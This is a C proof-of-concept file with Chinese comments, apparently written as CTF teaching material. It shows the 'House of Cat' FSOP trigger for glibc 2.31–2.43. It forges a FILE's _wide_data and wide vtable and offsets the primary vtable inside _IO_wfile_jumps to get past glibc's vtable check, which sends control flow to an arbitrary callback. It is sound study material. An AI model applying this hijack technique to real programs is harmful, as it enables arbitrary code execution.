#define _GNU_SOURCE
/*
 * House of Cat 最终触发点微型 PoC：glibc 2.31～2.43，x86-64。
 *
 * 模拟漏洞：可以覆盖 FILE 的 primary vtable、_wide_data 与 fake wide vtable。
 * 核心流程：
 *   __overflow -> 合法偏移后的 primary overflow 槽
 *              -> 进入宽字符定位函数 _IO_wfile_seekoff
 *              -> 进入宽字符读模式切换函数 _IO_switch_to_wget_mode
 *              -> 未经白名单的 fake wide-vtable overflow
 * 成功判据：cat_callback 被调用一次，参数中的 FILE 指针就是伪造对象。
 *
 * 这份程序只隔离验证 FSOP 最终触发点，不模拟 largebin 覆盖 stderr、malloc assert
 * 或最终 system/ORW。所有字段偏移均应在题目附件 libc 的 Build ID 上复核。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

typedef int (*overflow_fn)(FILE *, int);

static int callback_count;
static FILE *callback_file;

static int cat_callback(FILE *fp, int wide_eof)
{
    callback_count++;
    callback_file = fp;

    /* 返回 WEOF，让 _IO_switch_to_wget_mode 立即返回 EOF；这样只验证
       callback 最终触发点，不继续执行 _IO_wfile_seekoff 的 buffer/codecvt 路径。 */
    return WEOF;
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    FILE *fp = tmpfile();
    assert(fp != NULL);

    void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    overflow_fn call_overflow = (overflow_fn)dlsym(RTLD_DEFAULT, "__overflow");
    assert(wfile_jumps != NULL && call_overflow != NULL);

    void **wide_data_slot = (void **)((char *)fp + 0xa0);
    void **primary_vtable = (void **)((char *)fp + sizeof(FILE));
    void *saved_primary_vtable = *primary_vtable;
    void *saved_wide_data = *wide_data_slot;
    int saved_mode = fp->_mode;

    /* _IO_wide_data 在 x86-64 上的 _wide_vtable 位于 +0xe0。
       用 qword 数组表达可让 CTF 选手直接把索引对应到 payload offset。 */
    uint64_t fake_wide_data[0x100 / 8] __attribute__((aligned(0x10)));
    uint64_t fake_wide_vtable[0xa8 / 8] __attribute__((aligned(0x10)));
    memset(fake_wide_data, 0, sizeof(fake_wide_data));
    memset(fake_wide_vtable, 0, sizeof(fake_wide_vtable));

    /* 2.31 重写 _IO_iconv_t 后，_wide_vtable 缩到 +0xe0；该布局持续到 2.43。 */
    const size_t wide_vtable_offset = 0xe0;

    fake_wide_data[0x18 / 8] = 0; /* 将宽字符写缓冲区起点字段 _IO_write_base 置零。 */
    fake_wide_data[0x20 / 8] = 1; /* 令 _IO_write_ptr 大于 _IO_write_base，使刷新分支成立。 */
    fake_wide_data[wide_vtable_offset / 8] = (uintptr_t)fake_wide_vtable;
    fake_wide_vtable[0x18 / 8] = (uintptr_t)cat_callback; /* overflow 槽。 */

    *wide_data_slot = fake_wide_data;
    fp->_mode = 1;

    /* primary overflow=0x18，seekoff=0x48；+0x30 后仍位于合法
       __libc_IO_vtables section，因此 __overflow 内的校验不会终止进程。 */
    *primary_vtable = (char *)wfile_jumps + (0x48 - 0x18);

    int result = call_overflow(fp, EOF);

    assert(callback_count == 1);
    assert(callback_file == fp);

    /* 恢复真实 FILE 后再 fclose，避免 libc 用 fake wide_data 做清理。 */
    *primary_vtable = saved_primary_vtable;
    *wide_data_slot = saved_wide_data;
    fp->_mode = saved_mode;
    fclose(fp);

    puts("[+] Cat：宽表回调命中");
    return 0;
}
